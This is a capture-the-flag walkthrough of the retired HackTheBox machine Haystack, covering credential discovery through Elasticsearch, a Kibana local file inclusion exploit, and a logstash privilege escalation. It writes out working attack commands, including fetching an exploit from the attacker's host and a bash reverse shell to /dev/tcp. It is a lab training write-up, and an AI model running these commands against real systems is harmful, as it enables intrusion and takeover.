@@ -1,0 +1,109 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box: Haystack Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-haystack-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-02-29T05:27:02+00:00">February 29, 2020</time><time class="updated" datetime="2025-06-19T21:22:37+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, we’re sharing another Hack Challenge Walkthrough box: Haystack design by JoyDragon and the machine is part of the retired lab, so you can connect to the machine using your HTB VPN and then start to solve the CTF.</span></p>
+<p><span style="color: #000000;">The level of the Lab is set: Beginner to intermediate.</span></p>
+<p><span style="color: #000000;">Task: Capture the user.txt and root.txt flags.</span></p>
+<h3><span style="color: #800000;">Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP</span></li>
+<li><span style="color: #000000;">Abusing elastic search</span></li>
+<li><span style="color: #000000;">Base64 decode</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Initial Foothold</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SSH login</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting </strong></span></p>
+<ul>
+<li><span style="color: #000000;">LFI on Kibana</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing Execution function</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">Since we know the victim’s computer IP, we can begin with Nmap scanning to identify the open ports and services that run across it.</span></p>
+<pre class="lang:default decode:true">nmap -A 10.10.10.115</pre>
+<p><span style="color: #000000;">From this scanning test, we found port 80 &amp; 9200 open to HTTP, and port 22 open to SSH as well. Moreover, I find the HTTP method: DELETE is allow for nginx server at port 9200.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-OI3UdY6DTPY/XlnyrNpZhqI/AAAAAAAAi5A/Wmf8024lZz0S-juwp3BPwxEso8mmHofhQCLcBGAsYHQ/s1600/1.png"/></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">as we know enumeration is important, we search for port 80 and have found a picture on the web page. I download the image to test the metadata in the hope that the author might have concealed some hint inside the file.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-K0axXqMc0HE/XlnytzSfYpI/AAAAAAAAi5k/09_UBGMkUa0jgNK0Om6MGdmEq3l707cXgCLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">Hmmm! So, I found the bas64 code “bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==” through metadata extraction with the help of “string” command which is a Linux utility.</span></p>
+<pre class="lang:default decode:true">strings needle.jpg</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-FMLU2xLZXIw/Xlnyu-iM-yI/AAAAAAAAi5w/VVFclxHq9Qslvm0Rr2bU1E8wiknoHJssQCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">Then decode the above-extracted code with the help echo command:</span></p>
+<pre class="lang:default decode:true">echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" |base64 -d</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-CO5-4MuxIJM/XlnyvuVv7NI/AAAAAAAAi50/H4lTW8nMakcBt_O5H5OqKdLh7qXwBt0AACLcBGAsYHQ/s1600/4.png"/></p>
+<p><span style="color: #000000;">By decoding the encoded text of base64 I got a text that was in Spanish. I found the original text “the needle in the haystack is key with the help of google translator.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-4VHqlRW_rRw/Xlnyvz63QlI/AAAAAAAAi54/i_l5YXdCE-YfxTnT8GB4i-bEBgFOTXfngCLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">Then we navigate to port 9200 and found it was elastic search as shown in the image.</span></p>
+<p><span style="color: #000000;"><em>According to its official description: Elasticsearch is the central component of the Elastic Stack, a set of open-source tools for data ingestion, enrichment, storage, analysis, and visualization. Commonly referred to as the ELK Stack (after Elasticsearch, Logstash, and Kibana). </em></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-TfCksAJnXps/Xlnyv9muPKI/AAAAAAAAi58/ie-mp3-RfnQ0eRaZ4F-iw_ub2FB7SMyFwCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">Then I explore more about this and found <strong>link </strong>that teaches an interesting technique to search for a query and then search for clave that we have mentioned as “clave,” implying “key,” so I found two messages that were piped with base 64 encoded text in the Spanish again.</span></p>
+<pre class="lang:default decode:true">http://10.10.10.115:9200/_search?q=clave</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IJQ-oEQKC84/XlnywN6QUGI/AAAAAAAAi6A/C4he8c6RFo8VRRgdmGnAqmlzfwDUz8YWACLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">So, I translated the Spanish text message: “Tengo que guardar la clave para la maquina” = “I have to save the password for the machine”</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-d2nBmCE0Yxk/XlnywgyWw8I/AAAAAAAAi6E/IyHW5utVGngrp6d11CDArpEhpgPJ7fBvACLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">Further I decode the message “dXNlcjogc2VjdXJpdHkg” and found username “<strong>user: security</strong>”</span></p>
+<p><span style="color: #000000;">echo “dXNlcjogc2VjdXJpdHkg” | base64 -d</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VzYamVvYimA/XlnywoUOYpI/AAAAAAAAi6I/d_8TFIj3yY0L-j_-Yw_MAii6f3M9d6JSgCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">Similarly, I translated another text message “Esta clave no se puede perder, la guardo aca= “key cannot be lost, I keep it here”.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8dAbfwxt9ps/XlnyrESvJJI/AAAAAAAAi5E/HOUQToabM_Iw75Dz7HB_LoJI1WwWntn0ACLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">And then again decoded the base64 value which gave the password: “<strong>pass: spanish.is.key</strong>” for the username enumerated above.</span></p>
+<pre class="lang:default decode:true">echo "cGFzczogc3BhbmlzaC5pcy5rZXk" | base64 -d</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-d7vX5vyFL6s/Xlnyq6CbvzI/AAAAAAAAi48/JQXXkJwRFe8ezZ_Ojy7f-XNB8v8yKchWQCLcBGAsYHQ/s1600/11.png"/></p>
+<h3><span style="color: #800000;"><strong>Initial Foothold</strong></span></h3>
+<p><span style="color: #000000;">Now it was time to connect via ssh with the host machine, using the credentials mentioned above.</span></p>
+<pre class="lang:default decode:true">ssh security@10.10.10.115</pre>
+<p><span style="color: #000000;">Finally! we got the shell of the host machine shell and obtain the user.txt flag. Further we check /etc/passwd file and note the record given for user “kibana”.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-HfauBy5IsMM/XlnyrSRCuII/AAAAAAAAi5I/8L1JbA9XPk0-ChSSWz2rpgB1tRe2e43HwCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">Then we checked for process run by kibana and found another service running over port 5601 on a localhost.</span></p>
+<pre class="lang:default decode:true">ps aux | grep kibana</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-foFcrJYfJ2I/XlnysESY0_I/AAAAAAAAi5M/aGbteo5swasM8ag2NPmTT_popXY6I-u7QCLcBGAsYHQ/s1600/13.png"/></p>
+<p><span style="color: #000000;">We use curl for exploring the service running on localhost via port 5061 and luckily found the installed version 6.4.2 of the kibana.</span></p>
+<pre class="lang:default decode:true">curl http://127.0.0.1:5601</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-wVNeA-pkxPM/XlnysYMYI3I/AAAAAAAAi5U/NUjiyhwI5B0gXsCmGrb0hSLyBxwk5nF3gCLcBGAsYHQ/s1600/14.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploiting Kibana</strong></span></h3>
+<p><span style="color: #000000;">Hmmm! So, it was time hunt for its exploit if available on the internet. Fruitfully we got an exploit from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/mpgn/CVE-2018-17246">github</a> </strong></span>and according to this exploit a Local File Inclusion on Kibana found by CyberArk Labs, the LFI can be used to execute a reverse shell on the Kibana server.</span></p>
+<p><span style="color: #000000;">So, I just download the exploit code to my local machine and change the “attacker’s Address” as shown in the image and save the file with the name “raj.js” It was time to transfer the exploit to the host machine and start the Netcat listener that receives the host machine’s reverse connection.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-1nPEoYUclaM/XlnysY2x1lI/AAAAAAAAi5Q/a5C2PTlc7CMyyuhKvJRR3giUK_G4UCE6wCLcBGAsYHQ/s1600/16.png"/></p>
+<p><span style="color: #000000;">Now it was time to inject the payload on the vulnerable application, thus we downloaded the exploit “raj.js” into /tmp directory of the host machine.</span></p>
+<pre class="lang:default decode:true">curl -O http://10.10.14.12:8000/raj.js
+curl http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/raj.js</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-LIpQ-d6WNPk/XlnytMxD1sI/AAAAAAAAi5Y/Ae1eWdSjejc4X23cCB1P3iTEe77nm-1gQCLcBGAsYHQ/s1600/17.png"/></strong></span></p>
+<p><span style="color: #000000;">Soon you will get the reverse connection of the host machine via Netcat session as shown in the below image.</span></p>
+<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">So, it was time to escalate privilege for user kibana and for this, we enumerate the proc running under kibana group with the help of find command.</span></p>
+<pre class="lang:default decode:true">find / -group kibana 2&gt;/dev/null | grep -v proc</pre>
+<p><span style="color: #000000;">We found some three interesting .conf file: filter.conf, input.conf, output.conf at /etc/logstash.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-du3yKZUZN64/XlnythmQQ4I/AAAAAAAAi5g/uAYCezcW12sr0jQESaoocai-caxCq3gsQCLcBGAsYHQ/s1600/18.png"/></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
+<p><span style="color: #000000;">It was time to examine the file we found, so I investigate each file and conclude from each file the following remarks:</span></p>
+<p><span style="color: #000000;"><strong>Filter.conf:</strong> This file is used to filter commands given by the execute function to print a message for the given command that will be executing.</span></p>
+<p><span style="color: #000000;"><strong>Input.conf:</strong> Bundle the file which is by giving name as “/opt/kibana/logstash_*”</span></p>
+<p><span style="color: #000000;"><strong>Output.conf:</strong> This will run execute function for the given command.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zNYNFgFviKk/Xlnyto0m7SI/AAAAAAAAi5c/Foow4LgN3xEcAY1emUnyIDa41uswVE2GgCLcBGAsYHQ/s1600/19.png"/></p>
+<p><span style="color: #000000;">Thus, we run following command to get the reverse connection of the machine by saving the input in a file name as “logstash_raj” and wait for 10 sec to get the reverse connection on a new netcat listener.</span></p>
+<pre class="lang:default decode:true">echo "Ejecutar comando: bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.12/443 0&gt;&amp;1'" &gt; /opt/kibana/logstash_raj</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-vWe90ALA5g8/XlnyukexsjI/AAAAAAAAi5s/M83Dr9cZaUsCEh4L_gS6fvKdChz3-THsACLcBGAsYHQ/s1600/24.png"/></p>
+<p><span style="color: #000000;">Boom!! And after waiting for 10 sec we got the root privilege shell where we found our root flag.</span></p>
+<pre class="lang:default decode:true  ">cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;">I considered this to be a fascinating VM, where I learned a method of abusing “elasticsearch” and Kibana to escalate the shell of root privilege.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DQ7bmByIBvg/XlnyulmsqGI/AAAAAAAAi5o/rsJjpMeQa7sTMtKSLHhzPNxVqIfVMhAJACLcBGAsYHQ/s1600/25.png"/></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact</span> <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
